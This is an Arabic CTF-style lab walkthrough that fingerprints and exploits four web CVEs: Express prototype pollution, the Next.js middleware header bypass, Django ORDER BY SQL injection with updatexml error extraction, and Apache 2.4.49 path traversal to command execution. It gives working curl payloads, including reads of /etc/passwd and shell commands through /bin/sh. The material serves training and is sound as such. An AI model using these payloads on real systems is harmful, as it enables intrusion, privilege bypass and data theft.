## 🎯 النظرة العامة والنموذج الذهني (Mental Model)

تطورت تطبيقات الويب الحديثة من مجرد صفحات ثابتة وخوادم أحادية (Monolithic) إلى بيئات مبنية على أطر عمل حديثة ومعقدة: **MERN (Node.js/Express/React)، Next.js، Django، وخوادم أباتشي وإنجنكس**.

في اختبارات الاختراق المحدودة بالوقت:
> **"المختبر المحترف الذي يلمح `Apache/2.4.49` في الهيدر، أو `window.__next_f` في الكود المصدري، يحدد الثغرة المصنعية (CVE) فوراً ويبدأ استغلالها قبل أن ينتهي زميله من فحص المنافذ!"**

يرسخ هذا الروم منهجية: **التعرف السلبي على التقنية (Passive Fingerprinting) → فهم السبب الجذري للخلل (Root Cause) → تنفيذ سلسلة الاستغلال بدقة جراحية.**

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 1. البصمة السلبية (Passive Fingerprinting) - بدون إرسال أي حمولة استغلالية │
│ قراءة الهيدرز والكوكيز وعلامات الكود المصدري لتحديد البيئة والإصدار بدقة   │
└──────────────────────────────────────┬──────────────────────────────────────┘
                                       │
┌──────────────────────────────────────▼──────────────────────────────────────┐
│ 2. مطابقة الثغرة المصنعية (CVE Mapping)                                     │
│ ربط الإصدار بالثغرة المعروفة وفهم الآلية المعمارية للخلل                   │
└──────────────────────────────────────┬──────────────────────────────────────┘
                                       │
┌──────────────────────────────────────▼──────────────────────────────────────┐
│ 3. سلسلة الاستغلال الموجه (Exploit Execution Chain)                         │
│ • Express: تلويث النموذج الأولي وتجاوز الصلاحيات (CVE-2020-8203)            │
```

### Task 2 — MERN / Express: ثغرة تلويث النموذج الأولي (CVE-2020-8203)

#### 1. البصمة السلبية (Fingerprint)
* **ترويسة الـ HTTP:** `X-Powered-By: Express`.
* **كوكي الجلسة:** `connect.sid=s%3A...` (الكوكي الافتراضي لحزمة `express-session`).
* **شكل الأخطاء:** طلب مسار غير مسجل يعيد نصاً صريحاً: `Cannot GET /invalid-path`.

#### 2. السبب الجذري للثغرة (Root Cause)
في لغة جافاسكريبت، ترث كافة الكائنات خصائصها عبر سلسلة وراثة تنتهي بالكائن الأب المشترك: `Object.prototype`. 
عندما يقوم المطور ببرمجة دالة دمج (Merge) أو نسخ متكرر (Recursive Copy) تجمع بين كائن داخلي وبيانات JSON مرسلة من المستخدم دون تنقية المفاتيح الخاصة (`__proto__` أو `constructor.prototype`):

```javascript
// دالة دمج ضعيفة أمنياً
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]); // ينفذ إلى __proto__ ويكتب في Object.prototype!
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```
* **الأثر الأمني:** إذا حقن المهاجم خاصية `isAdmin: true` داخل `Object.prototype`، فإن **أي كائن في الذاكرة** (مثل كائن الجلسة العادي `currentUser`) ستصبح قيمة `currentUser.isAdmin` لديه تساوي `true` بالوراثة!

#### 3. منهجية الاستغلال خطوة بخطوة:
1. تحقق من البصمة وافتح جلسة عادية للحصول على كوكي `connect.sid`:
   ```bash
   curl -i -c cookies.txt http://MACHINE_IP:3000/api/login -d "username=user&password=user"
   ```
2. جرب طلب المسار الإداري المحمي وتأكد من الرفض:
   ```bash
   curl -b cookies.txt http://MACHINE_IP:3000/api/admin
   # سيعيد الخادم كود 403 Forbidden / Not Authorized
   ```
3. أرسل حمولة التلويث (Prototype Pollution Payload) إلى نقطة تعديل الحساب:
   ```bash
   curl -b cookies.txt -X POST http://MACHINE_IP:3000/api/user/update \
     -H "Content-Type: application/json" \
     -d '{"__proto__": {"isAdmin": true}}'
   ```
4. أعد طلب المسار الإداري بنفس الكوكي:
   ```bash
   curl -b cookies.txt http://MACHINE_IP:3000/api/admin
   ```
* **الاستدلال:** سينجح الطلب ويعود كود `200 OK` حاملاً فلاج الإدارة؛ لأن شرط الصلاحية تم تجاوزه من خلال الوراثة الملوثة.

### Task 3 — Next.js: تجاوز مصادقة الـ Middleware (CVE-2025-29927)

#### 1. البصمة السلبية (Fingerprint)
* **الهيدر:** `X-Powered-By: Next.js`.
* **العلامة القاطعة في الكود المصدري:** وجود كود استدعاء `window.__next_f` داخل وسوم السكريبت. هذه علامة مؤكدة على استخدام **App Router** ونظام React Server Components (RSC) لبروتوكول Flight.
* **سلوك الحماية:** عند طلب مسار محمي مثل `/dashboard` دون تسجيل، يقوم السيرفر بإعادة توجيه بكود `307 Temporary Redirect` نحو صفحة تسجيل الدخول.

#### 2. السبب الجذري للثغرة (CVSS 9.1 Critical)
يستخدم إطار Next.js ملف الـ Middleware لفحص الجلسات والمصادقة مركزياً قبل وصول الطلب للمسار المطلوب. ولمنع حدوث حلقات تكرار لا نهائية (Infinite Loops) عندما يقوم الـ Middleware بإعادة توجيه الطلبات داخلياً، أضاف الإطار هيدر داخلي خاص: `x-middleware-subrequest`.

> **الخلل المعماري القاتل:** لم يقم Next.js **بالتحقق مما إذا كان هذا الهيدر قادماً من عملية داخلية حقيقية أم مرسلاً من عميل خارجي غير موثوق!**

بمجرد إرفاق هذا الهيدر في طلب المستخدم، يفترض الإطار أن الطلب قد تم فحصه وتصفيته بالفعل، **فيتخطى تنفيذ كود الـ Middleware بالكامل** بما فيه كود التحقق من الجلسة والصلاحيات!

#### 3. منهجية الاستغلال خطوة بخطوة:
1. اطلب المسار المحمي وتأكد من التوجيه:
   ```bash
   curl -I http://MACHINE_IP:3001/dashboard
   # يعيد كود 307 نحو /login
   ```
2. أرسل الطلب مع إضافة الهيدر السري المكون من مسار ملف الـ Middleware مكرراً 5 مرات مفصولة بنقطتين:
   ```bash
   curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
     http://MACHINE_IP:3001/dashboard
   ```
   *(ملاحظة: إذا كان ملف الـ middleware موجوداً داخل مجلد `/src`، تكون القيمة: `src/middleware:src/middleware:...`).*
* **الاستدلال:** يتم تخطي فحص المصادقة فوراً، ويعيد السيرفر محتوى لوحة التحكم كاملاً مع الفلاج بكود `200 OK`.

### Task 4 — Django: حقن SQL في دوال الترتيب (CVE-2021-35042)

#### 1. البصمة السلبية (Fingerprint)
* **ترويسة الخادم:** `WSGIServer/0.2 CPython/...`.
* **كوكي الجلسة:** `csrftoken=...`.
* **البصمة شبه القطعية:** حقل الإدخال المخفي `csrfmiddlewaretoken` الذي يدرجه تلقائياً كلاس `CsrfViewMiddleware` في أي فورم من نوع POST:
  ```html
  <input type="hidden" name="csrfmiddlewaretoken" value="...">
  ```
* **الهيدرز الأمنية المرافقة:** `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`.

#### 2. السبب الجذري للثغرة (CVSS 9.8 Critical)
يحمي نظام Django ORM المطورين من ثغرات حقن SQL تلقائياً عبر تجهيز المعاملات (Parameterized Queries). تقع الكارثة عندما يقرر المطور الخروج عن حماية الـ ORM وبناء الاستعلام يدوياً عبر دمج وتجميع النصوص (String Concatenation):

```python
# كود ضعيف يدمج مدخلات المستخدم مباشرة في جملة الترتيب
order = self.request.GET.get('order', 'name')
sql = (
    f"SELECT * FROM products_product "
    f"ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)"
)
```

#### 3. تقنية الاستخراج عبر أخطاء XPath في MySQL (`updatexml`)
دالة `updatexml(1, concat(0x7e, (SELECT ...)), 1)` في MySQL مخصصة لتعديل مستندات XML. 
* القيمة `0x7e` تمثل الرمز `~` (Tilde). 
* نظراً لأن مسار XPath لا يجوز أن يحتوي على رمز `~`، تطلق قاعدة البيانات خطأ في بناء الجملة (Syntax Error)، **وتقوم بطباعة نتيجة الاستعلام الفرعي (Subquery) داخل نص رسالة الخطأ نفسها!**
* **الشرط الأساسي:** تنجح هذه التقنية لأن التطبيق يعمل في وضع التطوير `DEBUG = True`، مما يجعل دجانغو يعرض كامل رسالة الخطأ وقاعدة البيانات في المتصفح بكود 500.

#### 4. منهجية الاستغلال خطوة بخطوة:
1. نفذ طلب حقن لاستخراج اسم قاعدة البيانات النشطة:
   ```bash
   curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(SELECT%20database())),1)" \
     | grep -o '~[0-9a-zA-Z_][^&]*'
   ```
2. استخرج إصدار قاعدة البيانات:
   ```bash
   curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(SELECT%20version())),1)" \
     | grep -o '~[0-9a-zA-Z_][^&]*'
   ```
* **الاستدلال:** تجد اسم قاعدة البيانات مسرباً بدقة بين رموز `~` في رسالة الخطأ.

### Task 5 — Apache 2.4.49 (LAMP): تخطي المسارات إلى RCE (CVE-2021-41773)

#### 1. البصمة السلبية (Fingerprint)
* **هيدر السيرفر:** `Server: Apache/2.4.49 (Unix)` (مطابقة صريحة لثغرة خطيرة جداً).
* **فحص CGI:** طلب مسار `/cgi-bin/` يرجع كود `403 Forbidden` (وهذا يثبت أن المجلد موجود ومفعل في إعدادات الخادم عبر `mod_cgi`).

#### 2. السبب الجذري للثغرة (CVSS 9.8 Critical)
في إصدار أباتشي 2.4.49، تم تعديل دالة مسؤولة عن تنقية المسارات تُدعى `ap_normalize_path()`.
* **الخلل:** كانت الدالة تفحص مدخلات المسار **قبل** اكتمال فك ترميز الروابط (URL Decoding).
* السلسلة `.%2e/` (حيث `%2e` هو الترميز العشري للنقطة `.`) لا يتعرف عليها الفلتر كـ `../` عند لحظة الفحص فيسمح بمرورها.
* لاحقاً، عندما يُمرر الرابط لنظام ملفات السيرفر، يقوم النظام بفك الترميز فتتحول إلى `../`، مما يتيح الخروج من مجلد الموقع والوصول لجذر النظام بالكامل!

#### 3. التصعيد من قراءة الملفات إلى تنفيذ أوامر كامل (RCE)
عندما يكون موديول `mod_cgi` مفعلاً على مجلد `/cgi-bin/`، فإن التسلل عبر المسار إلى أي برنامج تنفيذي (مثل `/bin/sh`) يجعل الخادم يشغله كسكريبت CGI، ويتم تمرير أي بيانات تُرسل في الـ POST Body إلى المدخل القياسي (`stdin`) للشيل مباشرة!

* **قاعدة تقنية حرجة في `curl`:**
  أداة `curl` تقوم تلقائياً بتنظيف سلاسل `.%2e/` محلياً قبل إرسالها للشبكة. **يجب إجبارياً استخدام الراية `--path-as-is`** لضمان إرسال الرابط المشوه كما هو.

#### 4. منهجية الاستغلال خطوة بخطوة:
1. التحقق من قراءة الملفات الحساسة (`/etc/passwd`):
   ```bash
   curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
   ```
2. تنفيذ أوامر عن بُعد مع مراعاة هيدرز مخرجات الـ CGI:
   ```bash
   curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
     --data 'echo Content-Type: text/plain; echo; id; whoami'
   ```
3. قراءة فلاج النظام:
   ```bash
   curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
     --data 'echo Content-Type: text/plain; echo; cat /flag.txt'
   ```
* **الاستدلال:** يتم تنفيذ الأمر بصلاحيات مستخدم السيرفر وتطبع الشاشة محتوى الفلاج المطلوب.
